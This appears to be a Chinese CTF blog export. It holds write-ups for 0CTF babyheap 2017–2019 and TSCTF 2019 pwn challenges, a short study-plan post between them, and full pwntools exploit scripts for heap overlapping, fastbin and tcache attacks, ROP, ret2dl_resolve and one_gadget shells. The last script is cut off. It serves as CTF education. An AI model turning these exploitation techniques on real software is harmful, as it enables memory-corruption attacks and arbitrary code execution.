    <content type="text"><![CDATA[之前写过一个2017和2018的结合版分析，但是最近把2019年的复盘了，觉得三个在一起吧，算是fastbin_attack一个较完整的经历路程。（一家人就要整整齐齐。） 首先提供题目的二进制文件：2017_0ctf_babyheap 2018_0ctf_babyheap 2019_0ctf_babyheap 先来看2017的题目：预览：可以看到文件为64位，保护全开，给了Libc，标准的堆题。。。看到full relro一般为改hook为one_gadget。放进ida里进一步分析： 主要功能分析及漏洞寻找：可以看到程序开始时先选了一段随机不可控的地址来储存heap列表的基地址（base_ptr）。紧接着就进入了死循环，打印菜单，输入选项，运行函数。逐个分析功能： allocate()功能中，我们发现heap的content大小由我们自己决定（小于0x1000），是可控的，且heap结构体中会储存heap内容的大小。此外，我们申请堆块时用的是 calloc() 这意味着堆块的数据开始时要被初始化为0，这一点需要注意 fill()函数就是向我们申请过的chunk里填数据，不过有一个很明显的任意溢出更改漏洞。 free()就是将chunk指针free()，没有uaf漏洞。 print()函数就是打印对应下标的chunk的content，不过打印的内容是根据我们在allocate()时输入的size来决定的。 思考如何利用漏洞：首先我们的最终目标定为：将malloc_hook改为one_gadget，现阶段，我们只能借助于程序自身的fill()功能来进行写，而fill()功能又需要一个堆指针，所以我们的目标转化为如何使堆指针分配到malloc_hook附近，我们运用fastbin功能与overlapping结合的方法来实现。 leak:因为我们要确定malloc_hook的地址与one_gadget的地址，所以必须泄露出libc。 泄露功能，我们可以利用程序的print()功能来实现，先申请4个chunk（chunk2大小为smallchunk），然后通过0来改写1的size，然后通过标准的overlapping方法，先free()再malloc()，然后chunk2现在在1的里面，(这里要注意，因为是calloc，所以再次申请chunk1的时候，chunk2的chunk_header会被清零，需要fill()重新布置一下)，然后free chunk2，将其放入unsortedbin中，然后通过chunk1的print()打印出chunk2的fd指针，成功泄露libc。(这一部分不理解的可以看我文末的心得，有我第一次做的时候查的资料，帮助理解。) change:之后我们就可以先把chunk2（大小我们申请为0x60）放进fastbin里，然后通过chunk1改其fd指针为&amp;main_arena-0x33，然后在申请两次即可，然后再通过改chunk4的内容来改malloc_hook，再申请则会触发one_gadget。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap')libc=ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def free(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))offset = 0x3c4b20#---------------1.leak--------------------#-------------overlapping start-----------allocate(0x20) #index 0allocate(0x20) #index 1allocate(0x100) #index 2allocate(0x20) #index 3 隔离index 2 防止其被topchunk合并#---------------change--------------------payload = 'a'*0x20+p64(0)+p64(0x141)fill(0,len(payload),payload)#gdb.attach(p)#--------------free and malloc------------free(1)allocate(0x130)payload = '\x00'*0x20+p64(0)+p64(0x111) #因为calloc()会清空index 1fill(1,len(payload),payload)#--------------overlapping down-----------free(2)#gdb.attach(p)dump(1)p.recvuntil('Content: \n')main_arena_addr = u64(p.recv()[48:48+6].ljust(8,'\x00')) - 88libcbase = main_arena_addr - offsetone_gadget = 0x4526a #0x4526a 0xf02a4 0xf1147one_gadget_addr = libcbase + one_gadgetlog.success('libcbase = ' + hex(libcbase))#gdb.attach(p)#-------------leak down-------------------#---------------2.change------------------p.sendline('1') #index 2p.recvuntil(': ')p.sendline(str(96))#gdb.attach(p)free(2)#gdb.attach(p)fake_chunk_addr = main_arena_addr - 0x33payload = 'a'*0x20+p64(0)+p64(0x71)+p64(fake_chunk_addr)fill(1,len(payload),payload)#gdb.attach(p)allocate(0x60) #index 2#gdb.attach(p)allocate(0x60) #index 4payload = 'a'*0x13 + p64(one_gadget_addr)fill(4,len(payload),payload)allocate(0x20)p.interactive() 再来看2018的题目：主要功能分析与漏洞寻找：和2017年的题目类似，有一些小的变化，一个是allocate()最大只能申请0x58的chunk（虽然条件变得苛刻，但是等于从侧面告诉了我们方向是fastbin_attack），然后是fill()不再有任意溢出漏洞，而是只有off-by-one漏洞，这不影响overlapping，只是方法要复杂一点。 思考如何利用漏洞：leak:第一步肯定还是先想leak出libc，但是这个可能就有点小麻烦了。。。我们首先想到老方法：overlapping之后用大块打印小块的内容，但是小块一定是大于0x80的，所以我们不可能打印出小块的全部内容，我们也只需要fd指针位置的内容，这一点是可行的，但是因为chunk大小的限制，我们必须经过精心构造，来绕过检查。做了其他的fastbin_attack的题目后，又用了新方法：两个指针控制同一块chunk。。。。先将一块chunk（overlapping的小块）放进fastbin，然后利用overlapping的大块改其的fd指针最后一位为我们想要的重叠位置的chunk的地址的最后一位，因为内存页分配原则，导致他们地址除了最后的一个字节不一样，其他都一样。再malloc两次就完事，然后当重叠的chunk被free以后，还是可以通过另外一个堆指针来打印fd的内容，进行泄露。 change:这里也要注意，因为chunk最大为0x60，所以原来的直接把&amp;main_arena-0x33位置放进fastbin里已经失效（size为0x70），需要想别的办法。。。这里需要改top_chunk的地址(这里做的时候没想到。。。orz)，首先要知道top_chunk的地址在&amp;main_arena+80，而在&amp;main_arena+80和&amp;main_arena之间是用来存放fastbinY的，其值是fastbin中各个大小的的bins的头指针，如果全都没有的话则全为零，所以我们必须要一个chunk（其大小不能太小，不然离&amp;main_arena+88太远控制不了）来压住，并利用其来伪造出fake_chunk的size。然后我们可以将fake_chunk设在伪造处，然后fill()更改top_chunk的地址为我们计划的地址（&amp;main_arena-0x33)，再次申请一个chunk（大小可以覆盖到malloc_hook）即可，然后再fill()更改其值。 exp如下（leak用的新方法）：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('./libc-2.24.so')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(length))def update(ID,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(len(payload))) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def view(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))#leak出libcsize = 0x28allocate(size) #index 0allocate(size) #index 1allocate(size) #index 2allocate(size) #index 3size = 0x80allocate(size) #index 4payload = 'a'*0x28 + p8(0x61)update(0,payload)delete(1)allocate(0x50) #index 1delete(0)payload = 'a'*0x20+p64(0)+p64(0x31)update(1,payload)delete(2)payload = 'a'*0x20+p64(0)+p64(0x31)+p8(0xc0)update(1,payload)#gdb.attach(p)payload = 'a'*0x20+p64(0)+p8(0x31)update(3,payload)allocate(0x28) #index 0allocate(0x28) #index 2payload = 'a'*0x20+p64(0)+p8(0x91)update(3,payload)allocate(0x80) #index 5payload = 'a'*0x20+p64(0)+p64(0x31)update(5,payload)delete(4)view(2)p.recvuntil('Chunk[2]: ')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - 88log.success('main_arena='+hex(main_arena_addr))#gdb.attach(p)libcbase = main_arena_addr - 0x3c4b20one_gadget = 0x4526aone_gadget_addr = one_gadget + libcbaselog.success('libc=' + hex(libcbase))log.success('one_gadget='+hex(one_gadget_addr))#gdb.attach(p)#改malloc_hook的值为one_gadget'''#gdb.attach(p)payload = 'a'*0x20+p64(0)+p64(0x71) update(1,payload)payload = p64(0)+p64(0x81)update(2,payload)delete(0)payload = 'a'*0x20+p64(0)+p64(0x71)+p64(main_arena_addr-0x33)update(1,payload)#gdb.attach(p)''' allocate(0x48) #index 4delete(4)payload = p64(main_arena_addr+37)update(2,payload)allocate(0x58)delete(4)allocate(0x48) #index 4#gdb.attach(p)allocate(0x48) #index 6#gdb.attach(p)payload = '\x00'*35 + p64(main_arena_addr-0x33)update(6,payload)#gdb.attach(p)allocate(0x48) #index 7payload = '\x00'*0x13 + p64(one_gadget_addr)update(7,payload)#gdb.attach(p)allocate(0x48)'''allocate(0x60) #index 6payload = 'a'*0x13 + p64(one_gadget_addr)update(6,payload)'''p.interactive() 我第一次做两道题的时候的一些心得：2017-0ctf-babyheap: 这一题准备自己独立做的，结果只能相出大致思路，不会leak无法入手，看了writeup，学会了新姿势，也对fastbin attack有了更深的认识。 leak出libc的方法除了泄露got表外，还有另一种：通过泄露main_arena来泄露libc。详情见链接： 利用main_arena泄露libc __malloc_hook为函数指针，当其不为NULL时，优先调用其指向的函数，一般有堆题又开了full relro的基本为这种，或者是free的。 fastbin attack我的体会是其先free将chunk送入fastbin，然后如果有uaf的话直接改写其fd指针，没有uaf的话就通过溢出或者overlapping（需要off_one_by）来改写fd指针，然后再malloc使堆指针指向我们计划好的地方（这里需要注意要通过fastbin的检查，fake_chunk的size要和malloc(size)的size一样）。 fastbin的大小范围（总大小）为大于等于0x20小于等于0x80。 unsortedbin 的一些体会：ptr=malloc(0x80)，free(ptr),会被分到unsortedbin中，unsortedbin的结构图在上面的链接里有，其是在main_arena+88处 main_arena又在libc的data的段里。 当malloc()时，当fastbin里没有大小正好合适的chunk的时候，会从unsortedbin中找到大小大于需求的块切割了分给用户，剩下的继续留在unsortedbin中。 当free(smallchunk)时一定要注意不要被topchunk合并，并且不要触发unlink。 calloc()申请的空间会全设为’\x00’ 2018_0ctf_babyheap: 这一题算做出来百分之80，因为有2017年babyheap的经验大致思路有个轮廓。 不知道为啥exp得多尝试几次才能成功，有时候会报错。？？？ 对堆的利用有了更深的理解： leak的方式： 程序自带的打印功能，这又分为几种情况： 打印字符串（常见的有name，host等等），注意这些字符串输入的时候有没有最后 ‘\x00’ 的缺失，如果有的话就会泄露之后的数据；还要注意其是不是用strcpy()输入的，如果是的话，可能又会有漏洞。 打印功能的函数，目前碰到的有两种情况： 打印存在堆上的content的内容，而堆指针不知道在什么位置，这种一般是利用其泄露&amp;main_arena+88的地址。 打印存在堆上的content的内容，而堆指针知道在什么位置（bss段）或者也在堆上，然后通过unlink或者其他的方法（程序的edit功能漏洞）将堆指针改为函数的got表（一定要是调用后的函数），然后泄露函数实际地址进而泄露libc。 自己构造泄露，需要先通过操作实现change的功能，然后通过(比如）free(chunk_ptr)，先改free_got的值为put_plt，然后将chunk_ptr的值设为某个函数的got表，就泄露了那个函数的实际地址。 edit的方式： 程序自带的edit功能，可能存在off-by-one类漏洞（一般之后为chunk overlapping），或者直接不限制大小直接输入。 程序在申请chunk的时候就会输入内容。 2019_babyheap:分析功能和寻找漏洞：首先这道题libc是2.28，所以带有tcache，我们不要忘记了。 emmm。。。首先我们在准备函数里可以看到程序随机出一段地址，并用mmap申请了0x1000大小的内存，不过最值得我们关注的是其申请了一块0x1f000大小的堆内存，这让topchunk的大小落入我们有望消耗殆尽的范围以内，然后接着分析可以看到程序四个基本功能都有，new，delete，upgrade，view都齐全。 在new里我们看到最大的size限制到了0x58（和18年一样），然后个数限制在16内以内，除此之外，还有一个需要注意的问题是new用的是calloc()函数，这个函数直接调用了_int_malloc()，其和malloc()不同，其没有_get_tcache()的调用，所以我们new出的chunk只会从bins里取，不会从tcache里取。 在upgrade里我们可以发现一个off-one-null漏洞。 在view里就是打印。 在delete里就是free并清零。 分析漏洞及利用：综上所述这道题有off-one-null这个洞并且有view功能的话，leak出libc很明显就是用chunkoverlapping，但是现在的问题是要使用off-one-null的话必须使chunk的size是三位数（不然size直接变0了。。。），所以我们必须想办法破除size是0x58的限制，想办法获取unsortedbin中的chunk，再结合准备函数里的malloc(0x1f000)，可以想到是不断申请chunk释放chunk将topchunk消耗殆尽，然后调用malloc_consodilate使fastbin中的chunk合并获取unsortedbin_chunk，之后就是常规套路的泄露和带有tcache的house of spirit。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def upgrade(index,size,content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil('Content: ') p.send(content)def view(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index))def delete(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))#---------消耗topchunk,在消耗的同时使用off-one-null加快其消耗----------- size = 0x58for i in range(7): new(0x58) upgrade(i,0x58,'\x44'*0x58)for i in range(7): delete(i)#--------------------------------------------------------------------- size = 0x48for i in range(7): new(0x48) upgrade(i,0x48,'\x44'*0x48)for i in range(7): delete(i)#--------------------------------------------------------------------- size = 0x38for i in range(7): new(0x38) upgrade(i,0x38,'\x44'*0x38)for i in range(7): delete(i)#------------------------------------- for i in range(8): new(0x58) for i in range(1,7): delete(i)#---------------------------------------------------------------- 开始精准控制top大小for i in range(5): new(0x28) upgrade(i+1,0x28,'\x44'*0x28)for i in range(5): delete(i+1)for i in range(5): new(0x18)for i in range(5): delete(i+1)new(0x28) #malloc_consodilate 1delete(1)#-----------------------------------new(0x28) #1upgrade(1,0x28,'\x44'*0x28)new(0x58) #2new(0x58) #3new(0x58) #4new(0x48) #5new(0x48) #6new(0x38) #8delete(7)delete(2)new(0x28) #malloc_consodilate 2new(0x20) #7view(3)p.recvuntil('Chunk[3]: ')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f2a7d54dca0-0x7f2a7d369000)log.success('libcbase = '+hex(libcbase))#--------------leak down and start house of spirit-------------new(0x58) #9delete(9)upgrade(3,1,'\x5f')new(0x58) #9new(0x48) #10delete(10)fake_addr = libcbase+(0x7f47cdf6fc60+8-0x7f47cdd8b000)upgrade(4,8,p64(fake_addr)) new(0x48) #10new(0x48) #11 payload = p64(0)*5 + p64(libcbase+(0x7f23fdf77c18-0x00007f23fdd93000))[0:7]upgrade(11,len(payload),payload)upgrade(3,1,'\x00')for i in range(5): delete(i)new(0x48) #0new(0x48) #1new(0x48) #2new(0x48) #3new(0x48) #4new(0x48) #12one_gadget = [0x50186,0x501e3,0x103f50]'''0x50186 execve("/bin/sh", rsp+0x40, environ)constraints: rcx == NULL0x501e3 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x103f50 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''upgrade(12,16,p64(libcbase+one_gadget[2])+p64(libcbase+libc.sym['__libc_realloc']+4))new(0x10)#gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>堆的利用（fastbin_attack从基础到深度）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[to_do_list_of_next_stage]]></title>
    <url>%2F2019%2F06%2F09%2Fto-do-list-of-next-stage%2F</url>
    <content type="text"><![CDATA[端午浪了三天调整了一下身体，下周就要正式开始复习准备期末考试了。啊~~转眼间一年时间过去了，自己还是得抱着师傅们的大腿才能生存，因为上学期的教训复习完期末回来忘了自己要做啥，所以在这里先记录一下自己下一个stage的一些计划和任务，以方便和6月27号期末结束接轨。 PWN当然作为自己的主方向，pwn当然还是摆在首位的爷爷orz。 多线程方向的专题练习： T3LS大佬出的girlfriend，是我第一次做出来的，也是第一次接触到多线程的pwn题，感觉很有趣，但很多深层次的东西我都没理解，只是出于做题阶段，有必要深究一下原理。 2018_N1CTF的vote。 2018_N1CTF的null。以上两题都涉及到了多线程，准备拿来复盘一下，有不少师傅的blog里都有这两题的分析，panda师傅还有多线程的一些源码分析。 管道方面的题和socket通信方面的题： 17给了一道题，我还没自己看，但是我相信师傅给的题质量肯定很高orz。 自己以往也见过这种题，但是一直没有时间专门研究一下，自己对这一块还是有点惧怕的。 malloc.c源码和华庭的ptmalloc分析在我的印象中，源码一直是大佬才看到东西，所以我觉得要向大佬进阶必须做一些有难度的事情，malloc.c是必须要攻克的一关。 kernel_pwn:kernelpwn才是考验pwn选手最具有挑战性的内容之一，已经在大型比赛中见到了很多kernelpwn的压轴题，虽然早已跃跃欲试但一直觉得自己太菜还没资格去触碰，下个stage应该会把这一块当做一个主方向来攻克。 一些大型比赛的pwn题复现：感觉自己在面对真pwn(程序逻辑复杂，漏洞较隐蔽但是利用有套路的题目，题目难度在于程序本身而不在于技巧的利用)时能力还是太弱，程序一旦逻辑复杂就会掌控力不足从而心态和注意力导致一系列崩盘，我jio得这就是我线下赛被打爆的原因。。大型比赛的题目一般都是比较高质量，题目程序复杂度，还是技巧方面都比较有趣，这一块还是得多练习。 一些见到过但没时间了解的技巧训练： 改写dl_open_hook控制程序执行流程。 改写global_max_fast的来进行fastbin_attack。 利用stack_smash来泄露的题。 environ泄露栈地址的题。 关闭mallopt的题(大部分是largebin_attack)，这种技术之前复现过两题，但感觉还是没有真正得理解，需要继续加深。 等等等等。。。。。 逆向感觉要更深地理解底层的话，逆向还是需要看一下的，可能也是觉得自己只会一个方向太Low了，羡慕Sndav大佬能多线程发展，唉，学的晚没办法。。逆向好像还和解密有点关系，正好我密码也知识储备为0。。。以后的路线可能就是以pwn为主，逆向为辅。现在才发现pwn好像真的是对小白最友好的方向了。。。学过c就能学。。。 web这个实在没办法，因为web在现在社会用的太多了，简单的web开发也是程序员必要的素质之一。。所以我jio得有必要了解一下，但应该不会花太多时间去肝，还是老本行为重。反正web做出来题是不可能的。。。 待续。。。。Or2]]></content>
  </entry>
  <entry>
    <title><![CDATA[tsctf_2019_pwn前四题writeups]]></title>
    <url>%2F2019%2F05%2F18%2Ftsctf-2019-pwn-writeups%2F</url>
    <content type="text"><![CDATA[NOFIFE思路：因为两次输入栈上数据，可以第一次泄露出canary和程序基址，第二次利用rop调用puts函数打印出read函数的实际地址泄露出libc，并把程序的最后的ret_addr改为main，当再次从头开始运行时利用rop在bss段伪造一个rilimit结构体，将其值设置为合理值即可，然后调用setrlimit()函数解除文件打开数量为零的限制，最后用system()打开shell（one_gadgets也行应该。。。。没试 orz），读取flag。。。。（后来发现根本不需要泄露libc调用system。。。可以直接用vulfunc打开flag。。。。），这题当时做的时候一直思路错误，一直想把那个限制过掉，找了一下午资料都没有结果，这题也是我花时间最长，最让我崩溃的一题，后来发现这么多人做出来了，思路肯定不偏。。。。才回过来神。。。。在第二天中午出的。。。。过程很曲折。。。QAQ exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'debug = 1if debug: p = remote('10.112.100.47',6135)else: p = process('./nofile')P = ELF('./nofile')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')p.recvuntil('2,3or4?\n')p.sendline(str(24))p.recvuntil('Name?\n')payload = 'a'*0x18p.send(payload+'\x33')p.recvuntil('\x33')canary = u64(p.recv(7).ljust(8,'\x00'))canary = str(hex(canary)) + '00'canary = int(canary,16)log.success('canary = '+hex(canary))base = u64(p.recv(6).ljust(8,'\x00')) - 0xd80log.success('base = '+hex(base))p_rdi = base + 0xde3p_r15 = base + 0xde2p_rsi_r15 = base + 0xde1vul_addr = base + 0xc13bss = base + 0x202a00main = base+0xc94start = base+0x980part1 = 0xdd6 +basepart2 = 0xdc0 +base#part1为地址大的，part2为地址小的。def call_fun(fun_addr,arg3,arg2,arg1): payload = p64(part1) payload+= p64(0) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg1) payload+= p64(arg2) payload+= p64(arg3) payload+= p64(part2) payload+= 'a'*0x38 return payload#gdb.attach(p)sleep(0.5)p.send('n')p.recvuntil('Length?\n')p.sendline(str(0xc7))p.recvuntil('Name?\n')payload1 = 'a'*0x18 + p64(canary) + p64(bss)payload1+= p64(p_rdi)payload1+= p64(P.got['read']+base)payload1+= p64(P.plt['puts']+base)payload1+= call_fun(base+P.got['read'],0x10,bss,0) payload1+= p64(main)p.send(payload1)read_addr = u64(p.recv(6).ljust(8,'\x00'))log.success('read_addr'+hex(read_addr))libcbase = read_addr - libc.sym['read']log.success('libcbase = '+hex(libcbase))system_addr = libcbase + libc.sym['system']log.success('system_addr = '+hex(system_addr))sh_addr = libcbase + libc.search('/bin/sh\x00').next()log.success('sh_addr = '+hex(sh_addr))p.send(p64(0x10)+p64(0x10))#gdb.attach(p)p.recvuntil('2,3or4?\n')p.sendline(str(0xbf))p.recvuntil('Name?\n')payload2 = p64(0)*3+p64(canary)payload2+= p64(bss)payload2+= call_fun(base+P.got['setrlimit'],0,bss,7)payload2+= p64(p_rdi)+p64(sh_addr)+p64(system_addr)p.send(payload2)#gdb.attach(p)p.recvuntil('Right?\n')p.sendline('y')p.interactive() silent思路：看到题目是silent的时候就猜是关了stdout，还是没有leak，幸好是后者，前者我可能要凉。。。。然后看到这种啥都没有的栈题，又有*（got[1]+0x1c8）= NULL 的暗示。。。。很明显是64位的ret2_dl_resolve。。。。因为32位的之前做过，还算思路清晰，本来想自己构造的。。。。结果发现之前寒假好像有留了64位的基础构造脚本，直接拿来改了改数据就出了。。。。。。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'debug = 1if debug: p = remote('10.112.100.47',8001)else: p = process('./silent')P = ELF('./silent')lr = 0x40054abss = 0x602a00p_rdi = 0x0000000000400613p_rsi_r15 = 0x400611p_rdx = 0x400615p_rbp = 0x400490payload = 'a'*7p.send(payload)sleep(0.5)#gdb.attach(p)payload = 'a'*(0x70+8)payload+= p64(p_rdi)payload+= p64(0)payload+= p64(p_rsi_r15)payload+= p64(bss)payload+= p64(0)payload+= p64(p_rdx)payload+= p64(0x500)payload+= p64(P.plt['read'])payload+= p64(p_rbp)payload+= p64(bss)payload+= p64(lr)p.send(payload)sleep(0.5)plt_0 = 0x4003f0rel_plt = 0x400398dynstr = 0x400318dynsym = 0x4002b8fake_Rela_addr = bss + 0x150 #新栈上选择一块地址作为伪造的Elf64_Rela结构体基址，稍后还要通过计算进行0x18字节对齐fake_Sym_addr = bss + 0x190 #新栈上选择一块地址作为伪造的Elf64_Sym结构体基址，稍后还要通过计算进行0x18字节对齐，与上一个结构体之间留出一段长度防止重叠fake_dynstr_addr = bss + 0x1c0 #新栈上选择一块地址作为伪造的.dynstr函数名字符串system放置地址,与上一个结构体之间留出一段长度防止重叠binsh_addr = bss + 0x1c8 #"/bin/sh\x00"所在地址rel_plt_align = 0x18 - (fake_Rela_addr - rel_plt) % 0x18 #计算两个结构体的对齐填充字节数，两个结构体大小都是0x18rel_sym_align = 0x18 - (fake_Sym_addr - dynsym) % 0x18fake_Rela_addr = fake_Rela_addr + rel_plt_align #加上对齐值后为结构体真正地址fake_Sym_addr = fake_Sym_addr + rel_sym_alignfake_reloc_arg = (fake_Rela_addr - rel_plt)/0x18 #计算伪造的reloc_argfake_r_info = (((fake_Sym_addr - dynsym)/0x18) &lt;&lt; 0x20) | 0x7 #伪造r_info，偏移要计算成下标，除以Elf64_Sym的大小，最后一字节为0x7fake_st_name = fake_dynstr_addr - dynstr #计算伪造的st_name数值为伪造函数字符串system与.dynstr节开头间的偏移fake_Elf64_Rela_data = ""fake_Elf64_Rela_data += p64(P.got['read']) #r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误fake_Elf64_Rela_data += p64(fake_r_info)fake_Elf64_Rela_data += p64(0)fake_Elf64_Sym_data = ""fake_Elf64_Sym_data += p32(fake_st_name)fake_Elf64_Sym_data += p32(0x12) #后面的数据直接套用write函数的Elf64_Sym结构体，具体成员变量含义自行搜索，这里要注意数据大小fake_Elf64_Sym_data += p64(0)fake_Elf64_Sym_data += p64(0)payload = p64(bss)payload += p64(p_rdi) #为system函数设置参数"/bin/sh\x00" payload += p64(binsh_addr) payload += p64(plt_0) payload += p64(fake_reloc_arg) payload = payload.ljust(0x150, "A") #paddingpayload += 'A'*rel_plt_alignpayload += fake_Elf64_Rela_datapayload = payload.ljust(0x190, "A") #paddingpayload += 'A'*rel_sym_alignpayload += fake_Elf64_Sym_datapayload = payload.ljust(0x1c0, "A") #paddingpayload += "system\x00\x00"payload += "/bin/sh\x00"p.send(payload)#gdb.attach(p)p.interactive() babyheap思路：感觉babyheap和babytcache出的水平都很高orz，babyheap刚拿到时惊了卧槽。。。。只有malloc()和delete()的题我还是第一次见到。。。而且漏洞点好像也只有off_by_null ??? 但所幸我之前进行过noleak的专题训练，找了不少利用文件结构体泄露的题，然后泄露成功之后，想往main_arena-0x33分配fake_chunk，结构发现会有0x0a字符截断。。这个设计是真的巧妙。。。。最后是改了topchunk的地址为malloc_hook-0x10，然后改了malloc_hook为one_gadget，用free()来触发malloc_printerr来获取shell。。。。三个小时不到出的，但做完还是意犹未尽hhhh，真心感觉很棒！！！感觉把几个月刷的堆题的经验都掏空了orz。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#coding:utf-8from pwn import *context(os='linux',arch='amd64',timeout=0.2)#context.log_level = 'debug'debug = 0if debug: p = process('./babyheap')else: p = remote('10.112.100.47',10003)libc = ELF('./libc.so.6')P = ELF('./babyheap')def new(size,payload): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('Size: \n') p.sendline(str(size)) p.recvuntil('data: \n') p.send(payload)def delete(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('delete: \n') p.sendline(str(index))payload = '\x00'*0xf7new(0xf7,payload) #0new(0xf7,'\x01'*0xf7) #1 0x100new(0xf7,'\x02'*0xf7) #2 0x200new(0xf7,'\x03'*0xf7) #3new(0x20,'\x04'*0x20) #4delete(2)new(0xf8,'\x01'*0xf0+p64(0x300)) #2delete(0)delete(3)#-----------------------------------new(0x60,'\xdd\x15'+'\n') #0 bbnew(0x60,'\x03'*0x10+'\n') #3new(0x30,'\x00'*0x10+p64(0)+p64(0x101)+'\n') #5new(0x60,'\n') #6 kknew(0x100,'\n') #7new(0x100,'\x00'*0x50+p64(0)+p64(101)+'\n') #8new(0x40,'\n') #9delete(3)delete(6)delete(1)new(0xf8,p64(0)*3+p64(0x71)+'\x00'+'\n') #1new(0x60,'\n') #3new(0x60,'\n') #6new(0x68,'\x00'*0x33+p64(0xfbad1800)+p64(0x7f7d44fa36a3)*3+'\x50'+'\n') #10p.sendline()libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x00007f7d44fa36a3- 0x7f7d44bde000) log.success('libcbase = '+hex(libcbase))one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]main_arena = libcbase + (0x7fd58aac0b20-0x7fd58a6fc000)log.success('main_arena = '+hex(main_arena))p.recvuntil('invalid choice~~\n')p.recvuntil('&gt; ')p.sendline('2')p.recvuntil('delete: \n')p.sendline('1')'''io_list_all = libcbase+(0x7fb77a171520-0x7fb779dac000)log.success('io_list_all = '+hex(io_list_all))delete(5)new(0x38,p64(0)*2+'/bin/sh\x00'+p64(0x61)+p64(0)+p64(io_list_all-0x10)+'\n')delete(3)new(0x68,'\x00'*8+p64(0)+'\x00'*0x57+'\n')'''delete(0)delete(3)delete(6)new(0x60,p64(main_arena-(0x7fcaabde0b20-0x7fcaabde0b05))+'\n')new(0x60,'\n')new(0x60,'\n')new(0x60,'\x00'*0xb+p64(0)*5+p64(0x7f)+p64(main_arena+0x20)+'\n')new(0x60,'\x00'*0x28+p64(main_arena-0x20)+'\n')new(0xf0,'\n')new(0x20,p64(libcbase+one_gadget[2])+'\n')delete(11)#gdb.attach(p)p.interactive() babytcache思路：这题是第一天晚上三点半拿的一血。。。因为下午一直在nofile的错误思路中挣扎搞的心情烦躁不已。。。晚上10点半开始做，十二点多才静下心。。。这个题因为pwnable.tw上那道的误导导致开始思路错误。。浪费了free()的次数。。。之后向出题的师傅要了hint，也证实了我之前思路的错误。。。之后开始尝试新的思路，在0xabcda000上构造overlapping。。。然后利用文件结构体泄露出地址。。。改malloc_hook为one_gadget，尝试了一遍发现拿不到shell，然后进行realloc微调，getshell ! ! ! ! ! (做出这题过后，又看了一小时的nofife。。。还是在错误思路里绕，四点半顶不住。。。去睡觉了orz.) exp如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'debug = 0if debug: p = process('./main')else: p = remote('10.112.100.47',2333)P = ELF('./main')libc = ELF('./libc-2.27.so')def new(size,payload): p.recvuntil('choice:') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('data:') p.send(payload)def delete(): p.recvuntil('choice:') 